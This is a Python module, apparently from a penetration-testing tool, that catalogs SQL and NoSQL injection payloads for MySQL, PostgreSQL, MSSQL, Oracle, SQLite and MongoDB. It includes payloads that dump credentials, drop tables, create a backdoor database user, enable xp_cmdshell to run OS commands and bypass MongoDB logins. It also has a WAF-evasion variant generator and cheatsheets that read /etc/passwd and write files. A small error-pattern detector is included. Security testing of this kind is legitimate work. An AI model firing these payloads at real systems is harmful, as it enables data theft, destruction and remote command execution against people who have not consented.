#!/usr/bin/env python3
"""
SQL Injection Database Module
Comprehensive SQL injection payloads, techniques and detection
Author: SHAdd0WTAka
"""

import base64
import logging
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional

logger = logging.getLogger("ZenAI")


class DBType(Enum):
    """Database types"""

    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"  # NoSQL
    REDIS = "redis"  # NoSQL
    GENERIC = "generic"


class SQLITechnique(Enum):
    """SQL Injection techniques"""

    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BLIND_BOOLEAN = "blind_boolean"
    BLIND_TIME = "blind_time"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"


@dataclass
class SQLPayload:
    """SQL Injection payload"""

    name: str
    payload: str
    technique: SQLITechnique
    db_type: DBType
    severity: str
    description: str
    expected_result: str
    encoded_variants: Dict[str, str] = None


@dataclass
class SQLInjectionFinding:
    """SQL Injection finding"""

    url: str
    parameter: str
    technique: SQLITechnique
    db_type: DBType
    payload: str
    evidence: str
    severity: str = "Critical"


class SQLInjectionDatabase:
    """
    Comprehensive SQL Injection Database
    Contains payloads for various databases and techniques
    """

    def __init__(self, orchestrator=None):
        self.orchestrator = orchestrator
        self.payloads = self._initialize_payloads()
        self.findings = []

    def _initialize_payloads(
        self,
    ) -> Dict[DBType, Dict[SQLITechnique, List[SQLPayload]]]:
        """Initialize the payload database"""
        payloads = {}

        for db in DBType:
            payloads[db] = {}
            for tech in SQLITechnique:
                payloads[db][tech] = []

        # === MySQL Payloads ===
        payloads[DBType.MYSQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MySQL Error - Single Quote",
                payload="'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Basic error detection with single quote",
                expected_result="MySQL error message revealing SQL syntax",
            ),
            SQLPayload(
                name="MySQL Error - Double Quote",
                payload='"',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Error detection with double quote",
                expected_result="MySQL error message",
            ),
            SQLPayload(
                name="MySQL Error - AND 1=1",
                payload=" AND 1=1",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Boolean-based detection",
                expected_result="Query executes normally",
            ),
            SQLPayload(
                name="MySQL Error - AND 1=2",
                payload=" AND 1=2",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Boolean-based false condition",
                expected_result="No results or different page",
            ),
            SQLPayload(
                name="MySQL Error - Divide by Zero",
                payload=" OR 1/0--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Generate error via divide by zero",
                expected_result="Division by zero error",
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="MySQL Union - 1 Column",
                payload=" UNION SELECT NULL--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Union select with 1 column",
                expected_result="Union query executed",
            ),
            SQLPayload(
                name="MySQL Union - Version",
                payload=" UNION SELECT @@version--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract database version",
                expected_result="MySQL version displayed",
            ),
            SQLPayload(
                name="MySQL Union - User",
                payload=" UNION SELECT user()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract current user",
                expected_result="Database username",
            ),
            SQLPayload(
                name="MySQL Union - Database",
                payload=" UNION SELECT database()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract database name",
                expected_result="Database name displayed",
            ),
            SQLPayload(
                name="MySQL Union - All Tables",
                payload=" UNION SELECT table_name FROM information_schema.tables--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract all table names",
                expected_result="List of tables",
            ),
            SQLPayload(
                name="MySQL Union - Columns from Table",
                payload=" UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract column names from users table",
                expected_result="List of columns",
            ),
            SQLPayload(
                name="MySQL Union - Dump Users",
                payload=" UNION SELECT CONCAT(username,':',password) FROM users--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Dump username and password from users table",
                expected_result="User credentials",
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="MySQL Time - Sleep 5",
                payload="' OR SLEEP(5)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Time-based detection with 5 second delay",
                expected_result="Response delayed by 5 seconds",
            ),
            SQLPayload(
                name="MySQL Time - Benchmark",
                payload="' OR BENCHMARK(5000000,MD5(1))--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="CPU-intensive benchmark for time delay",
                expected_result="Response delayed due to CPU load",
            ),
            SQLPayload(
                name="MySQL Time - Conditional",
                payload="' OR IF(1=1,SLEEP(5),0)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Conditional time delay",
                expected_result="5 second delay if condition is true",
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.BLIND_BOOLEAN] = [
            SQLPayload(
                name="MySQL Boolean - Length Check",
                payload="' AND LENGTH(DATABASE())=1--",
                technique=SQLITechnique.BLIND_BOOLEAN,
                db_type=DBType.MYSQL,
                severity="High",
                description="Check database name length",
                expected_result="True if database name length matches",
            ),
            SQLPayload(
                name="MySQL Boolean - Substring",
                payload="' AND SUBSTRING(DATABASE(),1,1)='a'--",
                technique=SQLITechnique.BLIND_BOOLEAN,
                db_type=DBType.MYSQL,
                severity="High",
                description="Extract database name character by character",
                expected_result="True if character matches",
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.STACKED_QUERIES] = [
            SQLPayload(
                name="MySQL Stacked - Drop Table",
                payload="'; DROP TABLE users--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Stacked query to drop table (destructive!)",
                expected_result="Table dropped (test in safe environment only)",
            ),
            SQLPayload(
                name="MySQL Stacked - Create User",
                payload="'; CREATE USER 'hacker'@'localhost' IDENTIFIED BY 'password'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Create backdoor user",
                expected_result="New user created",
            ),
        ]

        # === PostgreSQL Payloads ===
        payloads[DBType.POSTGRESQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="PostgreSQL Error - Cast",
                payload="::integer",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="PostgreSQL cast error",
                expected_result="PostgreSQL type cast error",
            ),
            SQLPayload(
                name="PostgreSQL Error - Version",
                payload="'||version()||'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.POSTGRESQL,
                severity="High",
                description="Extract version via concatenation",
                expected_result="PostgreSQL version in error",
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="PostgreSQL Union - Version",
                payload=" UNION SELECT version()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract PostgreSQL version",
                expected_result="PostgreSQL version",
            ),
            SQLPayload(
                name="PostgreSQL Union - Current User",
                payload=" UNION SELECT current_user--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract current user",
                expected_result="Current database user",
            ),
            SQLPayload(
                name="PostgreSQL Union - Tables",
                payload=" UNION SELECT table_name FROM information_schema.tables--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract all table names",
                expected_result="List of tables",
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="PostgreSQL Time - Sleep",
                payload="'; SELECT pg_sleep(5)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Time-based with pg_sleep",
                expected_result="5 second delay",
            ),
            SQLPayload(
                name="PostgreSQL Time - Heavy Query",
                payload="'; SELECT (SELECT COUNT(*) FROM generate_series(1,10000000))--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="CPU-intensive query for delay",
                expected_result="Response delayed",
            ),
        ]

        # === MSSQL Payloads ===
        payloads[DBType.MSSQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MSSQL Error - CONVERT",
                payload="' AND 1=CONVERT(int,@@version)--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="MSSQL convert error reveals version",
                expected_result="MSSQL version in error",
            ),
            SQLPayload(
                name="MSSQL Error - Cast",
                payload="' AND 1=CAST(@@version AS int)--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="MSSQL cast error",
                expected_result="MSSQL version in error",
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="MSSQL Union - Version",
                payload=" UNION SELECT @@version--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Extract MSSQL version",
                expected_result="SQL Server version",
            ),
            SQLPayload(
                name="MSSQL Union - User",
                payload=" UNION SELECT SYSTEM_USER--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Extract system user",
                expected_result="Current system user",
            ),
            SQLPayload(
                name="MSSQL Union - Databases",
                payload=" UNION SELECT name FROM master.dbo.sysdatabases--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="List all databases",
                expected_result="All database names",
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="MSSQL Time - WAITFOR",
                payload="'; WAITFOR DELAY '0:0:5'--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Time-based with WAITFOR",
                expected_result="5 second delay",
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.STACKED_QUERIES] = [
            SQLPayload(
                name="MSSQL Stacked - Enable XP_CMDSHELL",
                payload=(
                    "'; EXEC sp_configure 'show advanced options',1; "
                    "RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
                ),
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Enable xp_cmdshell for RCE",
                expected_result="xp_cmdshell enabled",
            ),
            SQLPayload(
                name="MSSQL Stacked - Execute Command",
                payload="'; EXEC xp_cmdshell 'whoami'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Execute OS command via xp_cmdshell",
                expected_result="Command output",
            ),
        ]

        # === Oracle Payloads ===
        payloads[DBType.ORACLE][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="Oracle Error - UTL_INADDR",
                payload="' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Oracle error-based extraction",
                expected_result="Oracle version in error",
            ),
        ]

        payloads[DBType.ORACLE][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="Oracle Union - Version",
                payload=" UNION SELECT banner FROM v$version WHERE rownum=1--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Extract Oracle version",
                expected_result="Oracle version",
            ),
            SQLPayload(
                name="Oracle Union - User",
                payload=" UNION SELECT user FROM dual--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Extract current user",
                expected_result="Current Oracle user",
            ),
        ]

        payloads[DBType.ORACLE][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="Oracle Time - DBMS_LOCK",
                payload="' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM dual)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Time-based with DBMS_LOCK.SLEEP",
                expected_result="5 second delay",
            ),
        ]

        # === SQLite Payloads ===
        payloads[DBType.SQLITE][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="SQLite Union - Version",
                payload=" UNION SELECT sqlite_version()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.SQLITE,
                severity="Critical",
                description="Extract SQLite version",
                expected_result="SQLite version",
            ),
            SQLPayload(
                name="SQLite Union - Tables",
                payload=" UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.SQLITE,
                severity="Critical",
                description="Extract table names",
                expected_result="List of tables",
            ),
        ]

        # === NoSQL (MongoDB) Payloads ===
        payloads[DBType.MONGODB][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MongoDB - $ne Operator",
                payload='{"username": {"$ne": null}, "password": {"$ne": null}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $ne operator",
                expected_result="Authentication bypass",
            ),
            SQLPayload(
                name="MongoDB - $gt Operator",
                payload='{"username": {"$gt": ""}, "password": {"$gt": ""}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $gt operator",
                expected_result="Authentication bypass",
            ),
            SQLPayload(
                name="MongoDB - $regex",
                payload='{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $regex",
                expected_result="Authentication bypass",
            ),
        ]

        # === Generic Payloads ===
        payloads[DBType.GENERIC][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="Generic - Single Quote",
                payload="'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Basic single quote test",
                expected_result="SQL error",
            ),
            SQLPayload(
                name="Generic - Double Quote",
                payload='"',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Double quote test",
                expected_result="SQL error",
            ),
            SQLPayload(
                name="Generic - Backslash",
                payload="\\",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Backslash escape test",
                expected_result="SQL error",
            ),
            SQLPayload(
                name="Generic - Comment",
                payload="--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="Medium",
                description="Comment injection",
                expected_result="Query terminated",
            ),
            SQLPayload(
                name="Generic - Semicolon",
                payload=";",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Stacked query attempt",
                expected_result="Error or second query executed",
            ),
        ]

        return payloads

    def get_payloads(
        self, db_type: DBType = None, technique: SQLITechnique = None
    ) -> List[SQLPayload]:
        """Get payloads filtered by database type and/or technique"""
        results = []

        dbs = [db_type] if db_type else list(DBType)
        techs = [technique] if technique else list(SQLITechnique)

        for db in dbs:
            for tech in techs:
                if db in self.payloads and tech in self.payloads[db]:
                    results.extend(self.payloads[db][tech])

        return results

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload with various methods"""
        encodings = {
            "url": urllib.parse.quote(payload),
            "double_url": urllib.parse.quote(urllib.parse.quote(payload)),
            "base64": base64.b64encode(payload.encode()).decode(),
            "hex": payload.encode().hex(),
            "unicode": "".join([f"\\u{ord(c):04x}" for c in payload]),
        }
        return encodings.get(encoding, payload)

    def generate_waf_bypass_variants(self, payload: str) -> List[str]:
        """Generate WAF bypass variants of a payload"""
        variants = [payload]

        # Case variations
        variants.append(
            payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")
        )

        # Space alternatives
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "%09"))
        variants.append(payload.replace(" ", "%0a"))

        # Comment injection
        variants.append(payload.replace(" ", "/*!50000*/"))

        # URL encoding
        variants.append(urllib.parse.quote(payload))

        # Double encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # Unicode normalization
        variants.append(
            payload.replace("'", "%ef%bc%87")
        )  # Fullwidth apostrophe

        return list(set(variants))  # Remove duplicates

    async def analyze_response(
        self, original_response: str, modified_response: str, payload: str
    ) -> Optional[SQLInjectionFinding]:
        """Analyze if response indicates SQL injection"""

        # SQL error patterns
        error_patterns = [
            (r"SQL syntax.*MySQL", DBType.MYSQL),
            (r"Warning.*mysql_.*\(", DBType.MYSQL),
            (r"valid MySQL result", DBType.MYSQL),
            (r"MySqlClient\.", DBType.MYSQL),
            (r"PostgreSQL.*ERROR", DBType.POSTGRESQL),
            (r"Warning.*pg_.*\(", DBType.POSTGRESQL),
            (r"valid PostgreSQL result", DBType.POSTGRESQL),
            (r"Npgsql\.", DBType.POSTGRESQL),
            (r"Driver.*SQL.*Server", DBType.MSSQL),
            (r"OLE DB.*SQL Server", DBType.MSSQL),
            (r"(\W|\A)SQL.*Server.*Driver", DBType.MSSQL),
            (r"Warning.*mssql_.*\(", DBType.MSSQL),
            (r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}", DBType.MSSQL),
            (r"Exception.*Oracle", DBType.ORACLE),
            (r"Oracle error", DBType.ORACLE),
            (r"Oracle.*Driver", DBType.ORACLE),
            (r"Warning.*oci_.*\(", DBType.ORACLE),
            (r"Microsoft.*OLE.*DB.*Oracle", DBType.ORACLE),
            (r"SQLite/JDBCDriver", DBType.SQLITE),
            (r"SQLite\.Exception", DBType.SQLITE),
            (r"System\.Data\.SQLite\.SQLiteException", DBType.SQLITE),
            (r"Warning.*sqlite_.*\(", DBType.SQLITE),
            (r"\[SQLITE_ERROR\]", DBType.SQLITE),
        ]

        import re

        for pattern, db_type in error_patterns:
            if re.search(pattern, modified_response, re.IGNORECASE):
                return SQLInjectionFinding(
                    url="",
                    parameter="",
                    technique=SQLITechnique.ERROR_BASED,
                    db_type=db_type,
                    payload=payload,
                    evidence=f"Error pattern matched: {pattern}",
                    severity="Critical",
                )

        # Check for time-based injection (would need timing info)
        # Check for boolean-based (compare original vs modified)

        return None

    def get_cheatsheet(self, db_type: DBType) -> str:
        """Get SQL injection cheatsheet for a database"""
        cheatsheets = {
            DBType.MYSQL: """
MySQL SQL Injection Cheatsheet:

Comments:
  -- - (space required after --)
  #
  /* */

Version:
  SELECT @@version
  SELECT version()

User:
  SELECT user()
  SELECT system_user()
  SELECT session_user()

Database:
  SELECT database()
  SELECT schema()

String Concatenation:
  SELECT CONCAT('a','b')
  SELECT 'a' 'b'

Substrings:
  SELECT SUBSTRING('abc',1,1)
  SELECT MID('abc',1,1)

ASCII:
  SELECT ASCII('A')

Length:
  SELECT LENGTH('abc')

Conditional:
  SELECT IF(1=1,'true','false')
  SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END

Time Delay:
  SELECT SLEEP(5)
  SELECT BENCHMARK(1000000,MD5(1))

File Operations:
  SELECT LOAD_FILE('/etc/passwd')
  SELECT 'content' INTO OUTFILE '/tmp/file'

Information Schema:
  SELECT table_name FROM information_schema.tables
  SELECT column_name FROM information_schema.columns WHERE table_name='users'
""",
            DBType.POSTGRESQL: """
PostgreSQL SQL Injection Cheatsheet:

Comments:
  --
  /* */
  //

Version:
  SELECT version()

User:
  SELECT current_user
  SELECT session_user
  SELECT user

String Concatenation:
  SELECT 'a' || 'b'
  SELECT CONCAT('a','b')

Substrings:
  SELECT SUBSTRING('abc',1,1)
  SELECT substr('abc',1,1)

ASCII:
  SELECT ASCII('A')

Time Delay:
  SELECT pg_sleep(5)
  SELECT (SELECT COUNT(*) FROM generate_series(1,10000000))

File Operations:
  SELECT pg_read_file('postgresql.conf')
  COPY (SELECT '') TO '/tmp/file'

Information Schema:
  SELECT table_name FROM information_schema.tables
""",
            DBType.MSSQL: """
MSSQL SQL Injection Cheatsheet:

Comments:
  --
  /* */

Version:
  SELECT @@version

User:
  SELECT SYSTEM_USER
  SELECT CURRENT_USER
  SELECT SUSER_SNAME()

Database:
  SELECT DB_NAME()

String Concatenation:
  SELECT 'a' + 'b'
  SELECT CONCAT('a','b')

Substrings:
  SELECT SUBSTRING('abc',1,1)

ASCII:
  SELECT ASCII('A')

Time Delay:
  WAITFOR DELAY '0:0:5'
  WAITFOR TIME '12:00:00'

Command Execution:
  EXEC xp_cmdshell 'whoami'
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE

Information Schema:
  SELECT table_name FROM information_schema.tables
  SELECT name FROM sysobjects WHERE xtype='U'
""",
        }

        return cheatsheets.get(db_type, "Cheatsheet not available")
